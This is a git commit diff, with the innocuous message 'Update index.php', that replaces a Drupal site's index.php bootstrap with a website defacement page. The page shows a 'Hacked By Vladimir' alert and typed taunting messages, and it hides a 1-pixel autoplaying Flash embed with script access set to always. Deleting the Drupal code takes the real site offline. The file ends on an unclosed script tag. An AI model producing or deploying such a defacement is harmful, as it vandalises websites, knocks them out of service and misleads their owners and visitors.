19c9549acc390cee7389f3e15aefe1baef17de7d
VladimirCameron <vladik9908@hotmail.com>
2013-09-06 11:37:03 +0300

    Update index.php

--- site/index.php
+++ site/index.php
@@ -1,21 +1,44 @@
-<?php
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<!-- saved from url=(0063)http://zonehmirrors.net/defaced/2011/06/26/thtimes.pugmarks.in/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+  <script></script>
+  <title>Hacked</title>
+</head><script> alert("You have been Hacked By Vladimir")</script>
+<center><br><script language="Javascript">
+<!--
+var tl=new Array("Site Have been hacked by:-",
+"Vladimir",
+"Reason:-Your Website is only for noobs",
+"We are having an eye on you!",
+"/.Loging Out",
+"/.Vlad ")
+var speed=60;
+var index=0; text_pos=0;
+var str_length=tl[0].length;
+var contents, row;
+function type_text()
+{
+contents='';
+row=Math.max(0,index-20);
+while(row<index)
+contents += tl[row++] + '\r\n';
+document.forms[0].elements[0].value = contents + tl[index].substring(0,text_pos) + "_";
+if(text_pos++==str_length)
+{
+text_pos=0;
+index++;
+if(index!=tl.length)
+{
+str_length=tl[index].length;
+setTimeout("type_text()",1500);
+}
+} else
+setTimeout("type_text()",speed);
+}
+//--
+</script><body onload="type_text()" style="background-color: rgb(0, 0, 0); color: rgb(153, 0, 0); background-image: url(&quot;http://i276.photobucket.com/albums/kk1/3716591/matrix.gif&quot;);" alink="#000000" link="#0000cc" vlink="#000066"><p align="center"><img alt="" src="http://giffiles.alphacoders.com/310/3108.gif"></p>
+<form><textarea style="background-color: rgb(0, 0, 0); color: rgb(0, 255, 0);" name="about" readonly="readonly" rows="18" cols="80" wrap="soft">_</textarea><br>
+</form>
 
-/**
- * @file
- * The PHP page that serves all page requests on a Drupal installation.
- *
- * The routines here dispatch control to the appropriate handler, which then
- * prints the appropriate page.
- *
- * All Drupal code is released under the GNU General Public License.
- * See COPYRIGHT.txt and LICENSE.txt.
- */
-
-/**
- * Root directory of Drupal installation.
- */
-define('DRUPAL_ROOT', getcwd());
-
-require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
-drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
-menu_execute_active_handler();
+<object width="10" height="80" name="zs_player26878407" id="zs_player26878407" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" style="width: 1px; height: 1px; " __idm_id__="-1097613311"><param value="http://api.zippyshare.com/api/player.swf" name="movie"><param value="false" name="allowfullscreen"><param value="always" name="allowscriptaccess"><param name="wmode" value="transparent"><param value="baseurl=http://api.zippyshare.com/api/&amp;file=26878407&amp;server=8&amp;autostart=true&amp;flashid=zs_player26878407&amp;availablequality=both&amp;bordercolor=#140214&amp;forecolor=#000000&amp;backcolor=#000000&amp;darkcolor=#000000&amp;lightcolor=#0a0401" name="flashvars"><embed width="1" height="1" flashvars="baseurl=http://api.zippyshare.com/api/&amp;file=26878407&amp;server=8&amp;autostart=true&amp;flashid=zs_player26878407&amp;availablequality=both&amp;bordercolor=#140214&amp;forecolor=#000000&amp;backcolor=#000000&amp;darkcolor=#000000&amp;lightcolor=#0a0401" allowfullscreen="false" allowscriptaccess="always" type="application/x-shockwave-flash" src="http://api.zippyshare.com/api/player.swf" name="zs_player26878407" wmode="transparent" id="zs_player26878407" __idm_id__="-1097613310"></object>
+<script>
